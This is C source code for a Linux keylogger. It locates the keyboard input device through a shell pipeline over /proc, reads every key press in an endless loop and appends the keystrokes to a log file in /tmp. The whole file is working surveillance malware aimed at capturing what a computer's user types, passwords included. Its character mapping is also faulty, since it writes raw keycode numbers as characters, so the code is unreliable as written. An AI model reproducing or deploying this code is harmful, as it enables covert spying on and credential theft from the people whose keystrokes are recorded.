#include <stdio.h>
#include <fcntl.h>
#include <linux/input.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>

#define LOGFILEPATH "/tmp/keylogger.txt"

char *getEvent();

int main() {
    struct input_event ev;
    static char path_keyboard[40] = "/dev/input/";
    strcat(path_keyboard, getEvent());
    path_keyboard[strlen(path_keyboard) - 1] = 0;

    int device_keyboard = open(path_keyboard, O_RDONLY);
    if (device_keyboard == -1) {
        perror("Error opening device");
        exit(1);
    }

    FILE *fp = fopen(LOGFILEPATH, "a");
    if (fp == NULL) {
        perror("Error opening log file");
        exit(1);
    }

    while (1) {
        ssize_t n = read(device_keyboard, &ev, sizeof(ev));
        if (n == -1) {
            perror("Error reading device");
            exit(1);
        }

        if (ev.type == EV_KEY) {
            if (ev.value == 1) { // Key press
                switch (ev.code) {
                    case KEY_BACKSPACE:
                        fprintf(fp, "<BACKSPACE>");
                        break;
                    case KEY_ENTER:
                        fprintf(fp, "\n");
                        break;
                    case KEY_TAB:
                        fprintf(fp, "\t");
                        break;
                    case KEY_ESC:
                        fprintf(fp, "<ESC>");
                        break;
                    case KEY_LEFTSHIFT:
                    case KEY_RIGHTSHIFT:
                        // Ignore shift keys in logging, they are handled with their respective characters
                        break;
                    default:
                        // Print printable characters
                        if (ev.code >= KEY_1 && ev.code <= KEY_Z) {
                            fprintf(fp, "%c", ev.code);
                        } else {
                            fprintf(fp, "<KEYCODE_%d>", ev.code);
                        }
                        break;
                }
                fflush(fp); // Ensure the log is written immediately
            }
        }
    }

    close(device_keyboard);
    fclose(fp);
    return 0;
}

char *getEvent() {
    char *command = "cat /proc/bus/input/devices | grep -C 4 keyboard | grep -E -o 'event[0-9]'";
    static char event[8];
    FILE *pipe = popen(command, "r");
    if (!pipe) {
        perror("Error opening pipe");
        exit(1);
    }
    if (fgets(event, sizeof(event), pipe) == NULL) {
        perror("Error reading from pipe");
        pclose(pipe);
        exit(1);
    }
    pclose(pipe);
    return event;
}
